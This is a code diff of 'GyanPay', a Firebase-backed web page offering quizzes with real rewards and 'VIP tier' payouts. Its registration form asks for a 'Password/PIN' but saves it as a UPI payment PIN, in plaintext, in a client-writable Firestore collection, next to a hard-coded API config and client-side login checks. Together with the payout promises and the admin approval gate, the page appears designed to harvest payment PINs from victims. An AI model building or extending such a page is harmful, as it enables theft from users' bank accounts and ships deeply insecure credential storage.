@@ -3,107 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GyanPay - Play Quiz & Win</title>
+    <title>GyanPay - Live Quiz Gaming</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0f172a; color: #ffffff; margin: 0; padding: 0; }
-        .navbar { display: flex; justify-content: space-between; align-items: center; background-color: #1e293b; padding: 12px 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
-        .logo-area { display: flex; align-items: center; gap: 10px; font-size: 20px; font-weight: bold; color: #ffc107; }
-        .logo-icon { background: #ffc107; color: #0f172a; padding: 6px 12px; border-radius: 6px; font-weight: bold; }
-        .nav-buttons { display: flex; gap: 8px; }
-        .btn-nav { padding: 8px 14px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 13px; }
-        .btn-login { background-color: #3b82f6; color: white; }
-        .btn-register { background-color: #f59e0b; color: white; }
-        .btn-admin { background-color: #ef4444; color: white; text-decoration: none; display: inline-flex; align-items: center; }
-
-        .container { max-width: 550px; margin: 40px auto; background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 8px 16px rgba(0,0,0,0.4); }
-        h2 { color: #f8fafc; margin-bottom: 10px; text-align: center; }
-        p { color: #94a3b8; text-align: center; }
-
-        .form-section { display: none; margin-top: 20px; }
-        .form-section.active { display: block; }
-        .input-group { margin-bottom: 15px; text-align: left; }
-        label { display: block; margin-bottom: 5px; color: #cbd5e1; font-size: 14px; }
-        input { width: 100%; padding: 10px; background: #0f172a; border: 1px solid #475569; border-radius: 6px; color: white; box-sizing: border-box; }
-        .btn-submit { width: 100%; padding: 12px; background: #10b981; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        
-        .wallet-box { background: #0f172a; border: 1px solid #334155; padding: 20px; border-radius: 8px; margin-top: 20px; text-align: left; }
-        .timer-box { background: #172033; border: 1px solid #3b82f6; padding: 15px; border-radius: 8px; margin-top: 15px; text-align: center; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #fff; margin: 0; padding: 15px; }
+        .container { max-width: 500px; margin: auto; background: #1e293b; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        h2, h3 { text-align: center; color: #38bdf8; }
+        .card { background: #0f172a; padding: 15px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #334155; }
+        input, select { width: 100%; padding: 10px; margin: 8px 0; background: #1e293b; border: 1px solid #475569; color: #fff; border-radius: 6px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #2563eb; color: #fff; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        button:hover { background: #1d4ed8; }
+        .timer-badge { background: #ef4444; color: white; padding: 5px 12px; border-radius: 20px; font-weight: bold; float: right; }
+        .option-btn { background: #334155; margin: 8px 0; text-align: left; }
+        .option-btn:hover { background: #475569; }
+        .hidden { display: none; }
+        .alert-box { background: #312e81; border: 1px solid #6366f1; padding: 12px; border-radius: 6px; text-align: center; margin-bottom: 15px; }
     </style>
 </head>
 <body>
-
-    <div class="navbar">
-        <div class="logo-area">
-            <span class="logo-icon">G</span>
-            <span>GyanPay</span>
-        </div>
-        <div class="nav-buttons">
-            <button class="btn-nav btn-login" onclick="showTab('login')">Login</button>
-            <button class="btn-nav btn-register" onclick="showTab('register')">Register</button>
-            <a href="admin.html" class="btn-nav btn-admin">Admin Portal</a>
-        </div>
-    </div>
-
     <div class="container">
-        <!-- Home / Hero Section with Live Countdown Timer -->
-        <div id="homeHero" class="form-section active">
-            <h2>Play Quiz & Win Real Rewards</h2>
-            <p>Dynamic withdrawal limits & automated payout system.</p>
-            
-            <div class="wallet-box">
-                <h4 style="margin: 0 0 10px 0; color: #f59e0b;">🎁 आपका वॉलेट बैलेंस</h4>
-                <p style="margin: 0; color: #cbd5e1;">यूज़र: <b style="color: #fff;" id="displayUserName">Guest User</b></p>
-            </div>
+        <h2>GyanPay Quiz Platform</h2>
 
-            <!-- Live Timer Box -->
-            <div class="timer-box">
-                <h4 style="margin: 0 0 5px 0; color: #38bdf8;">⏳ क्विज़ शुरू होने में शेष समय:</h4>
-                <h2 id="countdownDisplay" style="margin: 0; color: #facc15;">Loading...</h2>
-            </div>
-
-            <button onclick="showTab('register')" class="btn-submit" style="background-color: #f59e0b; margin-top: 20px;">Get Started (Register)</button>
+        <!-- 1. Registration / Login Screen -->
+        <div id="authScreen" class="card">
+            <h3>User Registration</h3>
+            <input type="text" id="regName" placeholder="Enter Full Name">
+            <input type="text" id="regMobile" placeholder="Mobile Number">
+            <input type="password" id="regPin" placeholder="Create Password/PIN">
+            <button onclick="registerUser()">Register & Join</button>
         </div>
 
-        <!-- Login Section -->
-        <div id="loginSection" class="form-section">
-            <h2>User Login</h2>
-            <form id="loginForm">
-                <div class="input-group">
-                    <label>Mobile Number</label>
-                    <input type="text" id="loginMobile" required placeholder="Enter mobile number">
-                </div>
-                <div class="input-group">
-                    <label>Password / PIN</label>
-                    <input type="password" id="loginPin" required placeholder="Enter password">
-                </div>
-                <button type="submit" class="btn-submit">Login to Game</button>
-            </form>
+        <!-- 2. Waiting & Scheduled Timer Screen -->
+        <div id="waitingScreen" class="card hidden">
+            <div class="alert-box">
+                <p>Registration Successful! Waiting for Admin Approval & Quiz Start.</p>
+                <p id="approvalStatus" style="color: #f59e0b; font-weight: bold;">Status: Pending Approval</p>
+            </div>
+            <h3>⏳ Quiz Starts In:</h3>
+            <h1 id="liveCountdown" style="text-align: center; color: #10b981; font-size: 36px;">00:00:00</h1>
         </div>
 
-        <!-- Register Section -->
-        <div id="registerSection" class="form-section">
-            <h2>Create New Account</h2>
-            <form id="registerForm">
-                <div class="input-group">
-                    <label>Your Name</label>
-                    <input type="text" id="regName" required placeholder="Enter your name (e.g. Laky01)">
-                </div>
-                <div class="input-group">
-                    <label>Mobile Number</label>
-                    <input type="text" id="regMobile" required placeholder="Enter mobile number">
-                </div>
-                <div class="input-group">
-                    <label>Password / PIN</label>
-                    <input type="password" id="regPin" required placeholder="Create password">
-                </div>
-                <button type="submit" class="btn-submit">Register & Submit</button>
-            </form>
+        <!-- 3. Live Quiz Screen (10 Questions - 10 Sec Timer Each) -->
+        <div id="quizScreen" class="card hidden">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                <span id="qCountText" style="font-weight: bold; color: #38bdf8;">Question 1/10</span>
+                <span id="questionTimer" class="timer-badge">10s</span>
+            </div>
+            <p id="questionText" style="font-size: 18px; font-weight: bold; min-height: 50px;"></p>
+            <div id="optionsContainer">
+                <!-- Options will load dynamically -->
+            </div>
+        </div>
+
+        <!-- 4. Result & VIP Tier Distribution Screen -->
+        <div id="resultScreen" class="card hidden">
+            <h3>🎉 Quiz Completed!</h3>
+            <div id="scoreCard" style="text-align: center; font-size: 18px; margin: 15px 0;"></div>
+            <div id="vipTierBox" class="alert-box" style="background: #065f46; border-color: #10b981;">
+                <!-- VIP Allocation (VIP 1: 50%, VIP 2: 20%, VIP 3: 10%) -->
+            </div>
         </div>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getFirestore, collection, addDoc, getDocs, query, where } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+        import { getFirestore, collection, addDoc, doc, getDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
         const firebaseConfig = {
           apiKey: "AIzaSyAqbegdp-6ppy2EBaZDSWGWpMQRamKTCNc",
@@ -117,110 +80,175 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        window.showTab = function(tabName) {
-            document.getElementById('homeHero').classList.remove('active');
-            document.getElementById('loginSection').classList.remove('active');
-            document.getElementById('registerSection').classList.remove('active');
+        let currentUserId = localStorage.getItem("gyanpay_uid");
+        let currentUserName = localStorage.getItem("gyanpay_name");
 
-            if(tabName === 'login') {
-                document.getElementById('loginSection').classList.add('active');
-            } else if(tabName === 'register') {
-                document.getElementById('registerSection').classList.add('active');
-            } else {
-                document.getElementById('homeHero').classList.add('active');
-            }
-        };
-
-        function startCountdown() {
-            setInterval(() => {
-                const targetTime = localStorage.getItem("quizTargetTime");
-                if (!targetTime) return;
-
-                const now = new Date().getTime();
-                const distance = targetTime - now;
-
-                if (distance < 0) {
-                    document.getElementById("countdownDisplay").innerHTML = "🚀 Quiz is LIVE Now!";
-                    return;
-                }
-
-                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
-
-                document.getElementById("countdownDisplay").innerHTML = 
-                    `${hours}h : ${minutes}m : ${seconds}s`;
-            }, 1000);
+        if (currentUserId) {
+            document.getElementById("authScreen").classList.add("hidden");
+            document.getElementById("waitingScreen").classList.remove("hidden");
+            listenToUserStatus(currentUserId);
         }
-        startCountdown();
 
-        const regForm = document.getElementById('registerForm');
-        regForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const name = document.getElementById('regName').value;
-            const mobile = document.getElementById('regMobile').value;
-            const pin = document.getElementById('regPin').value;
+        window.registerUser = async function() {
+            const name = document.getElementById("regName").value;
+            const mobile = document.getElementById("regMobile").value;
+            const pin = document.getElementById("regPin").value;
+
+            if (!name || !mobile || !pin) {
+                alert("Please fill all fields!");
+                return;
+            }
 
             try {
-                await addDoc(collection(db, "usersData"), {
+                const docRef = await addDoc(collection(db, "usersData"), {
                     userName: name,
                     mobileNumber: mobile,
                     upiPin: pin,
                     status: "Pending",
-                    timestamp: new Date()
+                    timestamp: new Date().getTime()
                 });
-                alert('Registration successful! Waiting for Admin Approval.');
-                regForm.reset();
-                showTab('login');
-            } catch (error) {
-                console.error("Error: ", error);
+
+                localStorage.setItem("gyanpay_uid", docRef.id);
+                localStorage.setItem("gyanpay_name", name);
+                
+                document.getElementById("authScreen").classList.add("hidden");
+                document.getElementById("waitingScreen").classList.remove("hidden");
+                listenToUserStatus(docRef.id);
+            } catch (e) {
+                alert("Error registering: " + e.message);
             }
-        });
+        };
 
-        const loginForm = document.getElementById('loginForm');
-        loginForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const mobile = document.getElementById('loginMobile').value;
-            const pin = document.getElementById('loginPin').value;
+        function listenToUserStatus(uid) {
+            onSnapshot(doc(db, "usersData", uid), (docSnap) => {
+                if (docSnap.exists()) {
+                    const data = docSnap.data();
+                    const status = data.status || "Pending";
+                    document.getElementById("approvalStatus").innerText = "Status: " + status;
 
-            try {
-                const q = query(collection(db, "usersData"), where("mobileNumber", "==", mobile));
-                const querySnapshot = await getDocs(q);
-
-                if (querySnapshot.empty) {
-                    alert('Mobile number not found! Please register first.');
-                    return;
-                }
-
-                let userFound = false;
-                let userStatus = "Pending";
-                let fetchedName = "User";
-
-                querySnapshot.forEach((doc) => {
-                    const data = doc.data();
-                    if(data.upiPin === pin) {
-                        userFound = true;
-                        userStatus = data.status || "Pending";
-                        fetchedName = data.userName || "User";
+                    if (status === "Approved") {
+                        startGlobalTimer();
                     }
-                });
+                }
+            });
+        }
 
-                if(!userFound) {
-                    alert('Incorrect Password / PIN!');
+        // Global Countdown to start quiz
+        function startGlobalTimer() {
+            setInterval(() => {
+                const targetTime = localStorage.getItem("quizTargetTime") || (new Date().getTime() + 60000);
+                const now = new Date().getTime();
+                const distance = targetTime - now;
+
+                if (distance < 0) {
+                    document.getElementById("waitingScreen").classList.add("hidden");
+                    if(document.getElementById("quizScreen").classList.contains("hidden") && currentQuestionIndex === 0) {
+                        fetchQuestionsAndStartQuiz();
+                    }
+                } else {
+                    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                    const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+                    document.getElementById("liveCountdown").innerText = `${hours}h ${minutes}m ${seconds}s`;
+                }
+            }, 1000);
+        }
+
+        let quizQuestions = [];
+        let currentQuestionIndex = 0;
+        let userScore = 0;
+        let questionTimerInterval;
+        let timeLeft = 10;
+
+        async function fetchQuestionsAndStartQuiz() {
+            try {
+                const docSnap = await getDoc(doc(db, "quizConfig", "questionsData"));
+                if (docSnap.exists()) {
+                    quizQuestions = docSnap.data().questions || [];
+                }
+                if (quizQuestions.length === 0) {
+                    alert("Admin has not set questions yet!");
                     return;
                 }
-
-                if(userStatus === "Approved") {
-                    alert('Login Successful! Welcome ' + fetchedName);
-                    document.getElementById('displayUserName').innerText = fetchedName;
-                    showTab('home');
-                } else {
-                    alert('Your account is still PENDING for Admin Approval.');
-                }
-            } catch (error) {
-                console.error("Login Error: ", error);
+                document.getElementById("waitingScreen").classList.add("hidden");
+                document.getElementById("quizScreen").classList.remove("hidden");
+                loadQuestion();
+            } catch (e) {
+                alert("Error loading questions: " + e.message);
             }
-        });
+        }
+
+        function loadQuestion() {
+            if (currentQuestionIndex >= quizQuestions.length) {
+                endQuiz();
+                return;
+            }
+
+            clearInterval(questionTimerInterval);
+            timeLeft = 10;
+            document.getElementById("questionTimer").innerText = timeLeft + "s";
+
+            const qObj = quizQuestions[currentQuestionIndex];
+            document.getElementById("qCountText").innerText = `Question ${currentQuestionIndex + 1}/${quizQuestions.length}`;
+            document.getElementById("questionText").innerText = qObj.q;
+
+            const optContainer = document.getElementById("optionsContainer");
+            optContainer.innerHTML = "";
+
+            const options = [qObj.o1, qObj.o2, qObj.o3, qObj.o4];
+            options.forEach(opt => {
+                if(opt) {
+                    const btn = document.createElement("button");
+                    btn.className = "option-btn";
+                    btn.innerText = opt;
+                    btn.onclick = () => selectAnswer(opt, qObj.ans);
+                    optContainer.appendChild(btn);
+                }
+            });
+
+            // 10-Second Strict Anti-Cheat Timer
+            questionTimerInterval = setInterval(() => {
+                timeLeft--;
+                document.getElementById("questionTimer").innerText = timeLeft + "s";
+                if (timeLeft <= 0) {
+                    clearInterval(questionTimerInterval);
+                    currentQuestionIndex++;
+                    loadQuestion(); // Auto move to next question
+                }
+            }, 1000);
+        }
+
+        window.selectAnswer = function(selectedOpt, correctOpt) {
+            clearInterval(questionTimerInterval);
+            if (selectedOpt === correctOpt) {
+                userScore++;
+            }
+            currentQuestionIndex++;
+            loadQuestion();
+        }
+
+        function endQuiz() {
+            document.getElementById("quizScreen").classList.add("hidden");
+            document.getElementById("resultScreen").classList.remove("hidden");
+
+            document.getElementById("scoreCard").innerHTML = `<b>Your Score:</b> ${userScore} / ${quizQuestions.length}`;
+
+            // Automatic VIP Tier & Reward Percentage Allocation
+            let vipTier = "VIP 3";
+            let rewardPercent = "10%";
+            if (userScore >= 8) {
+                vipTier = "VIP 1";
+                rewardPercent = "50%";
+            } else if (userScore >= 5) {
+                vipTier = "VIP 2";
+                rewardPercent = "20%";
+            }
+
+            document.getElementById("vipTierBox").innerHTML = `
+                <h3>🏆 Tier Assigned: ${vipTier}</h3>
+                <p>Based on your performance, you qualified for <b>${rewardPercent} reward distribution</b>!</p>
+            `;
+        }
     </script>
 </body>
 </html>
